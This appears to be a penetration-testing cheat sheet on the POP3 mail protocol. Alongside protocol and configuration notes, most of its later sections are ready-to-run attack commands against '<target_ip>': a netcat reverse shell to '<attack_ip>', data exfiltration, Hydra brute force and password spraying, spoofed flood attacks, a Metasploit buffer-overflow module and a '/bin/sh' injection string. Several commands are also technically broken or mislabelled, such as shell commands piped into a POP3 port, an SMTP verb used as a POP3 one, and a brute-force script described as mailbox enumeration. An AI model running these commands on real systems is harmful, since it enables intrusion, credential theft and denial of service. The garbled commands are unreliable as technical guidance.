# Index
- [[Ports, Protocols, and Services]]
	- [[P995 POP3S]]

# Post Office Protocol version 3 (POP3)

- **Port Number:** 110 (default), 995 (SSL/TLS)
- **Protocol:** TCP
- **Service Name:** Post Office Protocol version 3 (POP3)
- **Defined in:** RFC 1939

Post Office Protocol version 3 (POP3) is an application-layer protocol used by email clients to retrieve emails from a mail server. POP3 is one of the most widely used email retrieval protocols, allowing users to download their email messages to their local device and then optionally delete them from the server.

## Overview of Features

- **Simple Design:** POP3 is a straightforward protocol that focuses on downloading and optionally deleting emails from a mail server, without complex features like folder management or server-side searches.

- **Connection-Oriented:** POP3 operates over TCP, ensuring reliable delivery of email messages. The standard port for unencrypted communication is port 110, while port 995 is used for encrypted (SSL/TLS) communication.

- **Stateless Interaction:** Once an email is downloaded, POP3 does not keep track of the message state on the server, meaning that email clients are responsible for managing local copies of the emails.

- **Limited Commands:** POP3 supports a small set of commands compared to other protocols like IMAP, making it easier to implement but also limiting its functionality.

- **Email Deletion:** POP3 allows users to delete emails from the server after they have been downloaded, which is useful for freeing up server space.

- **Authentication:** POP3 typically requires a username and password to authenticate the user before allowing email retrieval.

## Typical Use Cases

- **Offline Email Access:** POP3 is ideal for users who prefer to download their emails to their local devices and access them offline. This was particularly useful in environments with limited or intermittent internet connectivity.

- **Simple Email Clients:** Due to its simplicity, POP3 is often used in basic email clients that do not require advanced server-side features like those offered by IMAP.

- **Single-Device Email Access:** POP3 is well-suited for scenarios where emails are accessed from a single device, as it typically removes emails from the server after downloading, reducing the need for synchronization across multiple devices.

## How POP3 Protocol Works

1. **Connection Establishment:**
   - **Step 1:** The client establishes a TCP connection to the mail server on port 110 for unencrypted communication or port 995 for SSL/TLS encrypted communication.
   - **Step 2:** The server responds with a greeting message, indicating that it is ready to accept commands from the client.

2. **Authentication:**
   - **Step 3:** The client sends the `USER` command followed by the username to identify the user.
   - **Step 4:** The server responds with an acknowledgment, prompting the client to send the password.
   - **Step 5:** The client sends the `PASS` command followed by the password. If the credentials are correct, the server responds with a positive acknowledgment (`+OK`), indicating successful authentication.

3. **Mail Retrieval:**
   - **Step 6:** The client sends the `STAT` command to get the status of the mailbox, including the number of messages and their total size.
   - **Step 7:** The client uses the `LIST` command to retrieve a list of all messages in the mailbox along with their sizes.
   - **Step 8:** To retrieve a specific email, the client sends the `RETR` command followed by the message number. The server responds with the full content of the specified email.
   - **Step 9:** The client repeats the `RETR` command as necessary to download all desired emails.

4. **Email Deletion:**
   - **Step 10:** If the client wants to delete an email after downloading it, the `DELE` command is used, followed by the message number. The server marks the message for deletion.
   - **Step 11:** The client can send the `QUIT` command to end the session. Upon quitting, the server deletes all messages that were marked for deletion.

5. **Connection Termination:**
   - **Step 12:** The server closes the connection after the `QUIT` command or if the client disconnects abruptly.

### Diagram (Hypothetical Example)
- **Client:** `<attack_ip>` connects to `<target_ip>`:110
- **Server:** `<target_ip>` responds with a greeting message.
- **Client:** `<attack_ip>` sends `USER username`, `PASS password`, retrieves emails with `RETR`, deletes with `DELE`, and ends session with `QUIT`.
- **Server:** `<target_ip>` performs the requested operations and closes the connection.

# Additional Information

## Security Considerations
- **Plaintext Authentication:** When using port 110 (unencrypted), both the username and password are transmitted in plaintext, making them susceptible to interception by attackers on the same network.
  
- **SSL/TLS Encryption:** To mitigate the risk of credential theft, SSL/TLS encryption should be used by connecting on port 995, ensuring that the communication is secure.

## POP3 vs IMAP
- **POP3:** Designed for simple email retrieval and deletion, making it suitable for users who prefer offline access and minimal server interaction.
- **IMAP:** Provides advanced features like server-side folder management, email flagging, and access from multiple devices, making it more suitable for users with complex email management needs.

## POP3 Extensions
- **APOP (Authenticated Post Office Protocol):** An extension of POP3 that uses MD5 hashing to protect passwords during transmission, reducing the risk of credential theft on unencrypted connections.

- **STARTTLS:** Allows the upgrading of an existing plaintext connection to an encrypted connection using SSL/TLS.

## Modes of Operation
- **Download-and-Delete:** The traditional mode where emails are downloaded and then deleted from the server.
- **Download-and-Keep:** Some email clients allow emails to be downloaded but kept on the server, though this is less common with POP3 and can lead to mailbox management issues.

## Configuration Files

### POP3 Server Configuration Files

For servers hosting a POP3 service, configuration is typically managed through the following files, depending on the mail server software being used (e.g., Dovecot, Courier, etc.).

1. **Dovecot:**
- **File Location:** `/etc/dovecot/dovecot.conf`
- **Configuration Example:**
  ```bash
  protocols = imap pop3
  pop3_uidl_format = %08Xu%08Xv
  mail_location = maildir:/var/mail/%u
  ```
  - **Key Settings:**
    - `protocols`: Specifies the protocols enabled on the server, including POP3.
    - `pop3_uidl_format`: Defines the format of unique identifiers for messages.
    - `mail_location`: Defines the location where user mailboxes are stored.

2. **Courier:**
- **File Location:** `/etc/courier/pop3d`
- **Configuration Example:**
  ```bash
  POP3AUTH = LOGIN
  POP3DSTART = YES
  MAILDIRPATH = Maildir
  ```
  - **Key Settings:**
    - `POP3AUTH`: Defines the authentication mechanism used.
    - `POP3DSTART`: Specifies whether the POP3 service should start.
    - `MAILDIRPATH`: Defines the path to the user's mail directory.

### Client Configuration Files

For clients connecting to a POP3 service, configuration might involve setting the server address, port, and authentication details.

1. **Thunderbird:**
- **File Location:** User-specific profile folder (e.g., `~/.thunderbird/xxxxxxx.default/`)
- **Configuration Example** (prefs.js):
  ```javascript
  user_pref("mail.server.server1.type", "pop3");
  user_pref("mail.server.server1.hostname", "pop.example.com");
  user_pref("mail.server.server1.port", 995);
  user_pref("mail.server.server1.userName", "username@example.com");
  user_pref("mail.server.server1.socketType", 3);
  ```

## Potential Misconfigurations

1. **Using Unencrypted Connections:**
   - **Risk:** Using port 110 for POP3 without SSL/TLS leaves credentials and emails exposed to potential interception.
   - **Exploitation:** Attackers can capture the traffic using tools like Wireshark and extract sensitive information.

2. **Weak or Default Credentials:**
   - **Risk:** Using weak passwords or leaving default credentials unchanged can allow unauthorized access to email accounts.
   - **Exploitation:** Attackers can perform brute-force attacks to gain access to the email server, leading to data breaches.

3. **Improper Mailbox Permissions:**
   - **Risk:** Incorrect permissions on the mail directory could allow unauthorized users to access or modify emails.
   - **Exploitation:** Attackers could read, delete, or tamper with emails stored on the server.

4. **Inadequate Logging and Monitoring:**
   - **Risk:** Failing to log and monitor POP3 server activity can prevent the detection of unauthorized access or attacks.
   - **Exploitation:** Attackers can go undetected, maintaining access to email accounts or server resources.

## Default Credentials

Default credentials are uncommon for POP3 as it typically requires user-specific accounts. However, for initial setup or testing, some systems might use:

- **Username:** `admin` or `root`
- **Password:** `admin`, `password`, or `root`

These should be changed immediately upon installation to secure the server.

# Interaction and Tools

## Tools

### [[Telnet]]
- **Telnet Connect:** Establishes a connection to the specified IP.
	```bash
	telnet <target_ip> 110
	```
- **Authentication:** Logs in to the POP3 server using the provided username and password.
    ```bash
    USER username
    PASS password
    ```
- **Retrieve Emails:** Retrieves the specified email from the server.
	```bash
	RETR <message_number>
	```
- **Delete Emails:** Marks the specified email for deletion.
	```bash
	DELE <message_number>
	```
- **Quit Session:** Terminates the POP3 session, applying any changes such as deletions.
	```bash
	QUIT
	```
- **Checking Mailbox Status:** Returns the number of messages in the mailbox and the total size.
	```bash
	STAT
	```
- **List All Messages:** Lists all messages in the mailbox with their sizes.
	```bash
	LIST
	```
- **View Message Headers:** Retrieves the headers and the first `n` lines of the specified email, useful for inspecting without downloading the full content.
	```bash
	TOP <message_number> <n>
	```

### [[OpenSSL]]
- **Connect:** Establish an SSL/TLS encrypted connection to a POP3 server on port 995.
    ```bash
    openssl s_client -connect <target_ip>:995
    openssl s_client -connect <target_ip>:110 -starttls pop3
    ```

### [[cURL]]
- **Connect to POP3 with username and password:**
	```bash
	curl -k 'pop3://<target_ip>' --user <username>:<password>
	```
- **Use Verbose:** Display additional information on the connection
	```bash
	curl -k 'pop3://<target_ip>' --user <username>:<password> -v
	```

## Exploitation Tools

### [[Metasploit]]

### [[Wireshark]]
- **Wireshark Packet Capture:**
	```bash
	wireshark -i <interface> -f "tcp port 110"
	```

### [[Nmap]]
- **Basic Nmap Scan:** Scan target on specified port to verify if service is on.
    ```bash
    nmap <target_ip> -p 110,995
    ```

### [[NetCat]]
 - **Netcat TCP Connect:** Simple test to verify port service is running and responding.
    ```bash
    nc <target_ip> 110
    ```
- **Netcat UDP Connect:** Simple test to verify port service is running and responding.
    ```bash
    nc <target_ip> 110 -u
    ```
- **Execute Commands:** Execute commands on target.
	```bash
	echo "<command>" | nc <target_ip> 110
	```
- **Exfiltrate Data:** Exfiltrate data over specified port.
	```bash
    nc <target_ip> 110 < secret_data.txt
    ```

### [[SoCat Cheat Sheet]]
- **Socat TCP Connect:** Simple test to verify port service is running and responding.
	```bash
	socat - TCP:<target_ip>:110
	```

### [[HPing3 Cheat Sheet]]
- **Send UDP Packet:** Send a single UDP packet to the service.
    ```bash
    hping3 -2 <target_ip> -p 110 -c 1
    ```

### [[NetExec]]
### [[CrackMapExec]]
- **Connect via username/password:**
	```bash
	crackmapexec pop3 <target_ip> -u <username> -p <password>
	```

### [[Scapy]]
- **Example Code:**
    ```python
    from scapy.all import *
    pkt = IP(dst="<target_ip>")/TCP(dport=110)/Raw(load="USER username\r\n")
    send(pkt)
    ```

## Other Techniques

### Using Email Clients to access POP3
- **Description:** Leverage GUI email clients to access POP3.
	- **[[Evolution]]**
	- **[[Thunderbird]]**
	- **[[Microsoft Outlook]]**

# Penetration Testing Techniques

## External Reconnaissance

### Port Scanning
- **Tool:** [[Nmap]]
    ```bash
    nmap <target_ip> -p 110,995
    ```
- **Description:** Identifies if the target service is running on the target by scanning target port.

### Service Enumeration
- **Tool:** [[NetCat]]
    ```bash
    nc <target_ip> 110
    ```

## Persistence

### Maintaining Access
- **Tool:** [[NetCat]]
    ```bash
    echo "nc <attack_ip> 4444 -e /bin/sh" | nc <target_ip> 110
    ```
- **Description:** After gaining access, maintain persistence by creating reverse shells or scheduling tasks that connect back to the attacker's machine.

## Credential Harvesting

### Packet Capture 
- **Tool:** [[Wireshark]], 
	```bash
	wireshark -i <interface> -f "tcp port 110"
	```
- **Description:** Without encryption, credentials can be intercepted using a man-in-the-middle attack. Intercepting traffic to capture plaintext credentials.

## Privilege Escalation

### Abuse of Privileged Accounts
- **Tool:** [[Custom Scripts]]
    ```bash
    echo "su root -c '/bin/sh'" | nc <target_ip> 110
    ```
- **Description:** If a privileged account is compromised, escalate privileges by executing commands with elevated rights.

## Internal Reconnaissance

### Mailbox Enumeration
- **Tool:** [[NetCat]], [[Telnet]]
    ```bash
    echo "STAT" | nc <target_ip> 110
    ```
- **Description:** Enumerate mailbox details such as the number of messages and total size to gather information about the target’s email usage.

### Email Enumeration
- **Tool:** [[Nmap]]
    ```bash
    nmap <target_ip> -p 110 --script pop3-brute --script-args userdb=<username_file>,passdb=<password_file>
    ```
- **Description:** Enumerate mailbox details such as the number of messages and total size to gather information about the target’s email usage.

### Email-based Pivoting
- **Tool:** [[Custom Scripts]], SMTP Relays
    ```bash
    echo "RETR 1" | nc <target_ip> 110 | grep -oE 'Received: from ([0-9]{1,3}\.){3}[0-9]{1,3}'
    ```
- **Description:** Extract internal IP addresses from email headers to identify potential lateral movement targets within the network.

## Defense Evasion

### Encrypted Communication
- **Tool:** [[OpenSSL]], [[Stunnel]]
    ```bash
    openssl s_client -connect <target_ip>:995
    ```
- **Description:** Use encrypted connections on port 995 to avoid detection by monitoring tools that inspect plaintext traffic on port 110.

#### Low and Slow Attacks
- **Tool:** [[Custom Scripts]]
    ```bash
    for i in {1..1000}; do echo "USER user$i" | nc <target_ip> 110; sleep 60; done
    ```
- **Description:** Slowly enumerate users or attempt logins to avoid triggering rate-limiting or intrusion detection systems.

## Data Exfiltration

### Exfiltration via Email
- **Tool:** [[Custom Scripts]]
    ```bash
    echo "MAIL FROM: attacker@domain.com\nRCPT TO: victim@target.com\nDATA\nexfiltrated_data\n." | nc <target_ip> 25
    ```
- **Description:** Exfiltrate sensitive data by sending it via email to an external account, potentially using compromised POP3 credentials.

### Exfiltrating Data via Email Attachments
- **Tool:** [[Custom Scripts]]
     ```bash
     openssl s_client -connect <target_ip>:110
     USER <username>
     PASS <password>
     RETR <message_number>
     EOF
     ```
 - **Description:** Retrieve sensitive emails or attachments from the mail server and exfiltrate them via POP3.

# Exploits and Attacks

## Password Attacks

### Password Brute Force
- **Tool:** [[Hydra Cheat Sheet]]
    ```bash
    hydra pop3://<target_ip> -s 110 -l <username> -P <password_list>
    ```
- **Description:** Test a single username against multiple passwords.

### Password Spray
- **Tool:** [[Hydra Cheat Sheet]]
    ```bash
    hydra pop3://<target_ip> -s 110 -l <username_list> -P <password>
    ```
- **Description:** Test a multiple usernames against a single password.

### Credential Stuffing
- **Tool:** [[Custom Scripts]]
    ```bash
    for password in $(cat passwords.txt); do echo "USER username\nPASS $password" | nc <target_ip> 110; done
    ```
- **Description:** Test a list of known or common passwords across multiple accounts or servers.

### Exploiting Weak Authentication
- **Tool:** Custom Scripts, Hydra
```bash
echo "USER admin\nPASS 123456" | nc <target_ip> 110
```
- **Description:** Attempts to authenticate using commonly known weak or default passwords.

## Denial of Service

### TCP/UPD Flood Attack
- **Tool:** [[HPing3 Cheat Sheet]]
    ```bash
    hping3 <target_ip> -p <target_port> --flood --rand-source -c 1000
    ```
- **Description:** Flooding the port with connection attempts, potentially leading to a denial of service.

### TCP/UDP Reflection Attack
- **Tool:** [[HPing3 Cheat Sheet]]
    ```bash
    hping3 <target_ip_1> -p <target_port> --spoof <target_ip_2> --flood --rand-source -c 1000
    ```
- **Description:** Execute a reflection attack by sending requests with a spoofed source IP, causing the target to flood the victim with responses.

### POP3 Connection Flood
- **Tool:** [[Custom Scripts]], [[NetCat]]
    ```bash
    while true; do echo "USER user\nPASS pass" | nc <target_ip> 110; done
    ```
- **Description:** Flood the POP3 server with connection requests, potentially exhausting server resources and causing a denial of service.

### Malformed Command Injection
- **Tool:** [[Custom Scripts]], [[NetCat]]
    ```bash
    echo -e "RETR 9999999999" | nc <target_ip> 110
    ```
- **Description:** Send malformed commands that could cause the POP3 server to crash or become unresponsive.

## Exploits 

### POP3 Buffer Overflow
- **Tool:** [[Metasploit]], Custom Exploits
    ```bash
    use exploit/windows/pop3/pop3_login_buffer_overflow
    set RHOST <target_ip>
    set RPORT 110
    exploit
    ```
- **Description:** Exploit buffer overflow vulnerabilities in older or poorly configured POP3 servers to gain shell access or execute arbitrary code.

### POP3 Command Injection
- **Tool:** [[Custom Scripts]]
    ```bash
    echo -e "USER admin\nPASS admin\nEXPN | /bin/sh -i\n" | nc <target_ip> 110
    ```
- **Description:** Inject commands via POP3 commands, potentially allowing remote code execution or unauthorized access.

# Resources

|**Website**|**URL**|
|-|-|
|RFC 1939 (POP3 Specification)|https://tools.ietf.org/html/rfc1939|
|Dovecot POP3 Configuration|https://doc.dovecot.org/configuration_manual/protocols/pop3_server/|
|Courier POP3 Documentation|https://www.courier-mta.org/pop3d.html|
|OpenSSL Documentation|https://www.openssl.org/docs/|
|Nmap POP3 Scripts|https://nmap.org/nsedoc/scripts/pop3-brute.html|
|Wireshark POP3 Analysis|https://wiki.wireshark.org/POP3|
|Hydra Tool|https://github.com/vanhauser-thc/thc-hydra|
|Metasploit Framework|https://www.metasploit.com/|
|Linux man-pages|https://man7.org/linux/man-pages/|